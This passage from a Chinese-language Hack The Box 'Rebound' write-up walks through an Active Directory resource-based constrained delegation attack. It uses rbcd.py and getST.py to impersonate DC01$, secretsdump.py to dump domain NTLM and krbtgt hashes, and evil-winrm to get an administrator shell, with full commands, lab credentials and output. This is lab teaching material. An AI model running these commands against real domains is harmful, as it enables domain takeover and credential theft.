09:28:46 AM</span><br><span class="line">[*] Flags                         : (0xa10000) renewable, pre_authent, enc_pa_rep</span><br><span class="line">[*] KeyType                       : rc4_hmac</span><br><span class="line">[*] Base64(key)                   : mXyyvRmYSME0ojBYLu1ARg==</span><br><span class="line">[*] Kerberoast <span class="built_in">hash</span>               : $krb5tgs$18$USER<span class="variable">$REBOUND</span>.HTB$*delegator$*$d18681bc307159d28a5dee77<span class="variable">$7388dbaa197ffb2c1c1d8fd0f66364f10d54f413d38d3dc8d76ee15a5fdb14f368832fd07079a98621e71c5de8584afba4addd907407e91b47b5f972f16256e141a2902f4803b8df99e7d8713ea1026686e49402230b49657b52300b6b00e38c19a26f7054989a27bfee94a3622f60c60bf21f3440698689830991cc6743f4473ba341256d591b90f09f2a147db51c00fe30d5d71f2f1c26b206ca6dd1bc6c3f4d41c07ef872bbf6b8be34c811bb0dfde8de758fc257db360aa0cbcff89fd5b0b5bc7c62995e7725c87d3f9c9c87c7069d5b062ae171b545adbcf0bafea6433e52b7f24c6154e19728d71e72a9ea3c55eaa2091b4077ca4e194eac85bc5d1c1efda65dda0988d8c19d2df63641c0a170d196a01d66f6b911bf130265c0a89d59877f73a35f4a3ef417e4042c0dd47e1a7b9a75d5bc125e1501ab3a224ca5e6580f0940846a0cdc8bf68574ac5dac01efcaf937dabf57d65cf1399fd92909a5cb111e78ef4478cab989636d15fc07c04810c9b139f489331272b9155fc82b9c40a870e0076b688afbb08fb51277bed2279f71c62c97512ef56a090fd9149475e0184d3eb29ea33ce931067d84f570cd62dcfa3033dcf98aa9c8c59f3d412d11a962c69d8d9c9a488e3d4c118545e4f51d87906856632972362000b7d4ad71f8046c33e54f79db516c2e044fe79ed022dd649ae787c61931d8f549574200f127bdbfccf8f005316f2a71dac848df0a7e3571435341c014cb5b163e0e70e6de510858b0cf0341e535b3d9002fc06bea908cc8900cfa697f3b3c24aa765dd3b8b875a0d1a4b2c043943790ce88e4159c741b813ee504e044cda8cecdcb8557d09b6e6b9bb2179b83e12aa2e8f06abc9f7b237c9e77f232a40e7666731ebfaa6abf7152316df6437c718f654abe40f20c13252b579a791e7e0857e70c6919f41ae2678f93cab5b8fe472b14aff3a7cd3c8889e2b349a4831933d70ed202f4597bc8a00dfcc3d59b4eed91147b57fc732ebf62924139ec7312d4b5b5fe763d825fabf0a84ecd0ae297088ff4a9f9d8aa6879bd201f9d0cac32fc30c09016a5c3a34af261c3795adf847215f6ca4b454b4ff7b7e806d93880ffb443e8e3f51107527568c6248f0e759bf0a7c4ae614c1820c6125a709bede1d079b52f05d7f0456f825a4be8c8f6b62a6ce574b961297c945e736c564adeb8199c7bc9357e518851c6bac3a4e4322f1e3e6592d478b939189cc99b04170a62d5c867f3d0a5b506f0976b29b4aa30ef162e2dee75e4dd954f3913942ad182b73eebb929cbb65209ba53592f49a3024bab27df53f67310b8eef75acebcf26640206172b4681245f7ea1cc3b102c00dbed784ca31de4f172acb6ce5fe139c3c2e8f616583d25f7281cb008831cb1e3b6f02f7511ca3ec678fb8100425d0966a2f9a7d28ac9ecd5bdf52b3da64e90a86b95cabf1df30d7d61522fb1f5b663932275e91aa735975f445650b92cd58a16f1cd4f6e25420be34afd0a80a749419ccb720dc597de33812d188b0fa7a883766025e7f6e8ca032917404ca38b2de787fc348995cb4bade6881279672e475d3874851d9c07480914221fd57f102e2c6609edf799ce8eb19b81870326a58167515008dbdc7d6</span></span><br><span class="line">[*] Decoding unencrypted data <span class="keyword">in</span> credential[0][<span class="string">&#x27;ticket&#x27;</span>]:</span><br><span class="line">[*]   Service Name                : delegator$</span><br><span class="line">[*]   Service Realm               : REBOUND.HTB</span><br><span class="line">[*]   Encryption <span class="built_in">type</span>             : aes256_cts_hmac_sha1_96 (etype 18)</span><br><span class="line">[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied</span><br></pre></td></tr></table></figure>

<p>在这个阶段，仍然可以通过两种方式滥用受约束委托:</p>
<ol>
<li>进行基于资源的受限委托(RBCD)攻击。</li>
<li>在运行Kerberos侦听器时，强制或等待用户对服务进行身份验证。</li>
</ol>
<p>目前，前者似乎是更可行的选择。</p>
<h1 id="Resource-Based-Constrained-Delegation-RBCD"><a href="#Resource-Based-Constrained-Delegation-RBCD" class="headerlink" title="Resource-Based Constrained Delegation RBCD"></a>Resource-Based Constrained Delegation RBCD</h1><p>为了执行RBCD攻击，需要将另一个服务或用户附加到delegator$的msDS-AllowedToActOnBehalfOfOtherIdentity属性，允许其他服务委托给delegator$。</p>
<p>根据服务必须至少有一个SPN的<span class="exturl" data-url="aHR0cHM6Ly93d3cudGhlaGFja2VyLnJlY2lwZXMvYS1kL21vdmVtZW50L2tlcmJlcm9zI3RpY2tldHM=">constraint<i class="fa fa-external-link-alt"></i></span>来选择服务，这导致选择ldap_monitor。为了使rbcd.py工作，需要修改&#x2F;etc&#x2F;hosts，在其他主机名之前添加dc01，如下所示:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.231 dc01 dc01.rebound.htb rebound.htb</span><br></pre></td></tr></table></figure>

<p><em><strong>如果省略此更改，rbcd.py将返回[-]无效的服务器地址错误。</strong></em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rbcd.py rebound.htb/delegator\$ -hashes :43e9069a73081ecfcbe1514e1d4e3bc8 -k -delegate-from ldap_monitor -delegate-to delegator$ -action write -dc-ip dc01 -use-ldaps</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class="line">[*] Delegation rights modified successfully!</span><br><span class="line">[*] ldap_monitor can now impersonate <span class="built_in">users</span> on delegator$ via S4U2Proxy</span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound10.png"></li>
</ul>
<p>可以在powerview中验证这个属性是否被修改过:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">powerview rebound.htb/oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span>@dc01.rebound.htb -k</span><br><span class="line">Get-DomainObject -Identity delegator$</span><br><span class="line">objectClass                                  : top</span><br><span class="line">                                               person</span><br><span class="line">                                               organizationalPerson</span><br><span class="line">                                               user</span><br><span class="line">                                               computer</span><br><span class="line">                                               msDS-GroupManagedServiceAccount</span><br><span class="line">cn                                           : delegator</span><br><span class="line">distinguishedName                            : CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb</span><br><span class="line">instanceType                                 : 4</span><br><span class="line">whenCreated                                  : 20230408090831.0Z</span><br><span class="line">whenChanged                                  : 20240405143632.0Z</span><br><span class="line">uSNCreated                                   : 69353</span><br><span class="line">uSNChanged                                   : 428294</span><br><span class="line">name                                         : delegator</span><br><span class="line">objectGUID                                   : &#123;c9da97ae-5e35-44d2-aa15-114aecdc0caf&#125;</span><br><span class="line">userAccountControl                           : WORKSTATION_TRUST_ACCOUNT [4096]</span><br><span class="line">badPwdCount                                  : 0</span><br><span class="line">codePage                                     : 0</span><br><span class="line">countryCode                                  : 0</span><br><span class="line">badPasswordTime                              : 04/04/2024</span><br><span class="line">lastLogoff                                   : 0</span><br><span class="line">lastLogon                                    : 04/05/2024</span><br><span class="line">localPolicyFlags                             : 0</span><br><span class="line">pwdLastSet                                   : 04/02/2024</span><br><span class="line">primaryGroupID                               : 515</span><br><span class="line">objectSid                                    : S-1-5-21-4078382237-1492182817-2568127209-7687</span><br><span class="line">accountExpires                               : 9223372036854775807</span><br><span class="line">logonCount                                   : 107</span><br><span class="line">sAMAccountName                               : delegator$</span><br><span class="line">sAMAccountType                               : 805306369</span><br><span class="line">dNSHostName                                  : gmsa.rebound.htb</span><br><span class="line">servicePrincipalName                         : browser/dc01.rebound.htb</span><br><span class="line">objectCategory                               : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rebound,DC=htb</span><br><span class="line">isCriticalSystemObject                       : FALSE</span><br><span class="line">dSCorePropagationData                        : 16010101000000.0Z</span><br><span class="line">lastLogonTimestamp                           : 133562535487307243</span><br><span class="line">msDS-AllowedToDelegateTo                     : http/dc01.rebound.htb</span><br><span class="line">msDS-SupportedEncryptionTypes                : RC4-HMAC</span><br><span class="line">                                               AES128</span><br><span class="line">                                               AES256</span><br><span class="line">msDS-AllowedToActOnBehalfOfOtherIdentity     : AQAEgEAAAAAAAAAAAAAAABQAAAAEACwAAQAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAnSwX8yHn8FjpghKZAR4AAAECAAAAAAAFIAAAACACAAA=</span><br><span class="line">msDS-ManagedPasswordId                       : AQAAAEtEU0sCAAAAagEAAAoAAAAGAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==</span><br><span class="line">msDS-ManagedPasswordPreviousId               : AQAAAEtEU0sCAAAAagEAAAcAAAAeAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==</span><br><span class="line">msDS-ManagedPasswordInterval                 : 30</span><br><span class="line">msDS-GroupMSAMembership                      : AQAEgBQAAAAAAAAAAAAAACQAAAABAgAAAAAABSAAAAAgAgAABAAsAAEAAAAAACQA/wEPAAEFAAAAAAAFFQAAAJ0sF/Mh5/BY6YISmQYeAAA=</span><br></pre></td></tr></table></figure>

<p>再次运行findDelegation.py也会显示更新后的条目:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">findDelegation.py rebound.htb/oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span> -dc-ip dc01.rebound.htb -k</span><br><span class="line">[*] Getting machine hostname</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">AccountName   AccountType                          DelegationType                       DelegationRightsTo</span><br><span class="line">------------  -----------------------------------  -----------------------------------  ---------------------</span><br><span class="line">DC01$         Computer                             Unconstrained                        N/A</span><br><span class="line">ldap_monitor  Person                               Resource-Based Constrained           delegator$</span><br><span class="line">delegator$    ms-DS-Group-Managed-Service-Account  Constrained w/o Protocol Transition  http/dc01.rebound.htb</span><br></pre></td></tr></table></figure>

<p>现在已经准备好执行RBCD了。想法是，可以作为任何帐户从delegator$上的ldap_monitor请求票证，为delegator$上的模拟帐户创建一个可转发的ST。将模拟DC01$，因为Administrator被标记为敏感，不能委托:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity Administrator</span><br><span class="line">cn                                : Administrator</span><br><span class="line">description                       : Built-<span class="keyword">in</span> account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">distinguishedName                 : CN=Administrator,CN=Users,DC=rebound,DC=htb</span><br><span class="line">memberOf                          : CN=Group Policy Creator Owners,CN=Users,DC=rebound,DC=htb</span><br><span class="line">                                    CN=Domain Admins,CN=Users,DC=rebound,DC=htb</span><br><span class="line">                                    CN=Enterprise Admins,CN=Users,DC=rebound,DC=htb</span><br><span class="line">                                    CN=Schema Admins,CN=Users,DC=rebound,DC=htb</span><br><span class="line">                                    CN=Administrators,CN=Builtin,DC=rebound,DC=htb</span><br><span class="line">name                              : Administrator</span><br><span class="line">objectGUID                        : &#123;37857665-6e2e-4f12-9976-5c9babcd8282&#125;</span><br><span class="line">userAccountControl                : NORMAL_ACCOUNT [1114624]</span><br><span class="line">                                    DONT_EXPIRE_PASSWORD</span><br><span class="line">                                    NOT_DELEGATED</span><br><span class="line">badPwdCount                       : 1</span><br><span class="line">badPasswordTime                   : 04/05/2024</span><br><span class="line">lastLogoff                        : 0</span><br><span class="line">lastLogon                         : 03/29/2024</span><br><span class="line">pwdLastSet                        : 04/08/2023</span><br><span class="line">primaryGroupID                    : 513</span><br><span class="line">objectSid                         : S-1-5-21-4078382237-1492182817-2568127209-500</span><br><span class="line">adminCount                        : 1</span><br><span class="line">sAMAccountName                    : Administrator</span><br><span class="line">sAMAccountType                    : 805306368</span><br><span class="line">objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=rebound,DC=htb</span><br></pre></td></tr></table></figure>

<p>然后可以使用delegator$的受限特权将可转发的ST转发到DC，从而在DC上为DC01$创建一个ST。</p>
<p>首先，从delegator$上的ldap_monitor请求一个ST，模拟DC01$。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getST.py rebound.htb/ldap_monitor:<span class="string">&#x27;1GR8t@$$4u&#x27;</span> -spn browser/dc01.rebound.htb -impersonate DC01$</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[*] Impersonating DC01$</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> DC01<span class="variable">$@browser_dc01</span>.rebound.htb@REBOUND.HTB.ccache</span><br></pre></td></tr></table></figure>

<p>这允许通过提供刚刚生成的票证来跳过S4U2Self步骤，这是可转发的:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">describeTicket.py DC01\<span class="variable">$@browser_dc01</span>.rebound.htb@REBOUND.HTB.ccache</span><br><span class="line">[*] Number of credentials <span class="keyword">in</span> cache: 1</span><br><span class="line">[*] Parsing credential[0]:</span><br><span class="line">[*] Ticket Session Key            : 767d153d636e861400de859c0d561ba9</span><br><span class="line">[*] User Name                     : DC01$</span><br><span class="line">[*] User Realm                    : rebound.htb</span><br><span class="line">[*] Service Name                  : browser/dc01.rebound.htb</span><br><span class="line">[*] Service Realm                 : REBOUND.HTB</span><br><span class="line">[*] Start Time                    : 05/04/2024 09:45:34 AM</span><br><span class="line">[*] End Time                      : 05/04/2024 19:45:33 PM</span><br><span class="line">[*] RenewTill                     : 06/04/2024 09:43:52 AM</span><br><span class="line">[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep</span><br><span class="line">[*] KeyType                       : rc4_hmac</span><br><span class="line">[*] Base64(key)                   : dn0VPWNuhhQA3oWcDVYbqQ==</span><br><span class="line">[*] Kerberoast <span class="built_in">hash</span>               : $krb5tgs$18$USER<span class="variable">$REBOUND</span>.HTB$*browser/dc01.rebound.htb*$8a9675ea512659235df48421<span class="variable">$7458895533348641c64dc62d133e5e03b4884970efdc309d94bd69c6048ee1e41fc7223cbaa570d0dbaa677985115f8b10153b4e08f299f5e5625fbb8d280a8226ab6ec8aeec14a9cde49902c9441dfee71e0fc38bd342d8af61593edd951f1d9d05499e5c01bd3fbeab18cbdc7876a6a189fa7c853d944d6057312d52a53bbe294b2191211a247c198abd00bb95152f74b8b1488c343a381d28ced950705b379ada4cf2d433e87ecfc34dbc29026cc05042e81933a1221781064d17ffae974ac83038236a17cee8151eab2e11014a90deca09b7e05632d564728c489add0fc6f68b8bd0ab425e1f3a891d38f47e3bf61d07dc1a1e7211080b0ad1211eb5543455235dd9f01da926c249480fb8b195346cedba939a5ba9239f9f8c6d270524d6e5b1aad7aa8fb8488c75964ffc964098b60c212658725e85bea570c88396551e23e0af1f19f7042bfa38db3fb4f3ee87efca16931f7cdf05a5179d264b1d63addd312325d1012e2106d305aeecdc8e645eaa089890b37b0f44d615a547b0049bc2f4618e63ea9653437c5c18f16c115f106ef259d1800429d1302ccfef6c2392636a571789f83fd56596b776efbd784d0153beb770ae6eee1771fbb561c079803c5a56a0026946ecc88c730647df64968d65f6b91f6a096657e439e73c7145df53fc7e7ab8ead89ebdcf52952cd42f5e6a5496aaf3a1c3142ad719687769ec44de969223c94fe0990e9fe3f73e71fbd99cfff2f0a6c609a0a08c325ddbef586a1d4c88f5f648dcfe4390565f4ada6a13805152b247837cd2cac7adc98b1b4bd755829566896aea34e12f35ae6bd4f9ed29bc7849d998168e7a7ce3f67f6ba0ed6faf6a85c80e180234ef34d106ea7cdcdd45749849ada99ddc2e0e9584473cf69c785016d59df543965feaefaf254a621faa1a5dd4e8a397c1a70baae027c6e5d69bf934dd873566dbe6857b96450cae2a8e3ccdafa7d6550f3ebad667a3d1f4bd5a95729a817907d3246c34da60ff1ee54d31592e9e2c006feb485db8cde5ada3ef04dba13522409acbc835b2d66017f6366e27dfa487b1d15c634ef03446c7f0baf1b4e106161242c45704f026a1ed95207c6bdce5842d8ab9ab7606841a6c632140d4e543bf8d8a696d0960db0799ff19e4148294ef6d47be90c18d5c66fa69e69ea48390b73e2981d8d9146f5788c4d2bfe9ffb5498b75dcef923202fc8da417003280a27797ea0e5d6592cc0419f500df5cf6188d20be4b7d909ec3d137366da5ccc0d1a58b8a1a73bcdfc64d602ffa91d72c0438364ca56b195f8f5beed6f6f1720184ce553341b12cde0291eb24c6e8c5d96d186bbedcdff254673c3b4de709f3f6d3c27aabbb45c5779d223eb81e5b97fd7da406226d7012d5b1e350fe9f73b133dde5777efb7781b1b7759ccc8b8b3af0574d16ffd1a0ea0121973b3fd0129b07a0b4034163212242f5b429e9b562c4f9d6f69c91e1990701625d7afbc7624b70bc54d92040a9a02e0d5aab61abd85462a74624d35a25f1774df006705c7ffae4f8158f5c8a70e19b81f8b93ca2b9d0d50d193f462a80d1cc2cb6dd6f2efc96667ac1ce796e13ff721d7dd812efc9ec993fa99b2af0b7321fa4bc35ddc072caf2d2bf5aff6b9d2249490a2c97fbae72f66d4948f1aab10a15fc161a92e0a873136a1c581083c0b18c7cdbe8c13a2708e9f8f5e4f5bc389b9b808f98dcb25fdb80ca593049b6497819610cce55a755d568ab52253e563b7aa8e42dc4b5f659937188989582191a97652beff2eac4bf0bf5d064f1d29c2b662751ede388</span></span><br><span class="line">[*] Decoding unencrypted data <span class="keyword">in</span> credential[0][<span class="string">&#x27;ticket&#x27;</span>]:</span><br><span class="line">[*]   Service Name                : browser/dc01.rebound.htb</span><br><span class="line">[*]   Service Realm               : REBOUND.HTB</span><br><span class="line">[*]   Encryption <span class="built_in">type</span>             : aes256_cts_hmac_sha1_96 (etype 18)</span><br><span class="line">[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied</span><br></pre></td></tr></table></figure>

<p>完成攻击</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getST.py rebound.htb/delegator\$ -hashes :43e9069a73081ecfcbe1514e1d4e3bc8 -spn http/dc01.rebound.htb -additional-ticket DC01\<span class="variable">$@browser_dc01</span>.rebound.htb@REBOUND.HTB.ccache -impersonate DC01$</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[*] Impersonating DC01$</span><br><span class="line">[*]     Using additional ticket DC01<span class="variable">$@browser_dc01</span>.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> DC01<span class="variable">$@http_dc01</span>.rebound.htb@REBOUND.HTB.ccache</span><br></pre></td></tr></table></figure>

<p>通过使用-additional-ticket flag指定可转发票据，将其直接提供给S4U2Proxy，这允许在域控制器上获得DC01$的ST。</p>
<p>最后，将票据提供给secretsdump.py，获得Administrator的hash。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(impacket-fork) [root@kali ~ ]$ KRB5CCNAME=./DC01\<span class="variable">$@http_dc01</span>.rebound.htb@REBOUND.HTB.ccache secretsdump.py -k -no-pass dc01.rebound.htb -just-dc-user administrator</span><br><span class="line">/root/impacket-fork/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  __import__(<span class="string">&#x27;pkg_resources&#x27;</span>).run_script(<span class="string">&#x27;impacket==0.10.1.dev1+20231106.134307.9aa93730&#x27;</span>, <span class="string">&#x27;secretsdump.py&#x27;</span>)</span><br><span class="line">Impacket <span class="keyword">for</span> Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f</span><br><span class="line">Administrator:des-cbc-md5:ad8ac2a825fe1080</span><br><span class="line">[*] Cleaning up...</span><br><span class="line">(impacket-fork) [root@kali ~ ]$ KRB5CCNAME=<span class="string">&#x27;DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache&#x27;</span> secretsdump.py -no-pass -k dc01.rebound.htb -just-dc-ntlm</span><br><span class="line">/root/impacket-fork/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  __import__(<span class="string">&#x27;pkg_resources&#x27;</span>).run_script(<span class="string">&#x27;impacket==0.10.1.dev1+20231106.134307.9aa93730&#x27;</span>, <span class="string">&#x27;secretsdump.py&#x27;</span>)</span><br><span class="line">Impacket <span class="keyword">for</span> Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1108b27a9ff61ed4139d1443fbcf664b:::</span><br><span class="line">ppaul:1951:aad3b435b51404eeaad3b435b51404ee:7785a4172e31e908159b0904e1153ec0:::</span><br><span class="line">llune:2952:aad3b435b51404eeaad3b435b51404ee:e283977e2cbffafc0d6a6bd2a50ea680:::</span><br><span class="line">fflock:3382:aad3b435b51404eeaad3b435b51404ee:1fc1d0f9c5ada600903200bc308f7981:::</span><br><span class="line">jjones:5277:aad3b435b51404eeaad3b435b51404ee:e1ca2a386be17d4a7f938721ece7fef7:::</span><br><span class="line">mmalone:5569:aad3b435b51404eeaad3b435b51404ee:87becdfa676275415836f7e3871eefa3:::</span><br><span class="line">nnoon:5680:aad3b435b51404eeaad3b435b51404ee:f9a5317b1011878fc527848b6282cd6e:::</span><br><span class="line">ldap_monitor:7681:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::</span><br><span class="line">oorend:7682:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::</span><br><span class="line">winrm_svc:7684:aad3b435b51404eeaad3b435b51404ee:4469650fd892e98933b4536d2e86e512:::</span><br><span class="line">batch_runner:7685:aad3b435b51404eeaad3b435b51404ee:d8a34636c7180c5851c19d3e865814e0:::</span><br><span class="line">tbrady:7686:aad3b435b51404eeaad3b435b51404ee:114e76d0be2f60bd75dc160ab3607215:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:989c1783900ffcb85de8d5ca4430c70f:::</span><br><span class="line">delegator$:7687:aad3b435b51404eeaad3b435b51404ee:43e9069a73081ecfcbe1514e1d4e3bc8:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound11.png"></li>
</ul>
<p>使用evil-winrm获得一个administrator shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@kali] - [~/hackthebox/machine/rebound] - [2582]</span><br><span class="line">└─[$] evil-winrm -i dc01 -u administrator -H 176be138594933bb67db3b2572fc91b8                                                                         [5:36:50]</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">rebound\administrator</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span> ../desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <span class="built_in">cat</span> root.txt</span><br><span class="line">af2b247a25910f7c8b320c45ab507ae4</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound12.png"></li>
</ul>
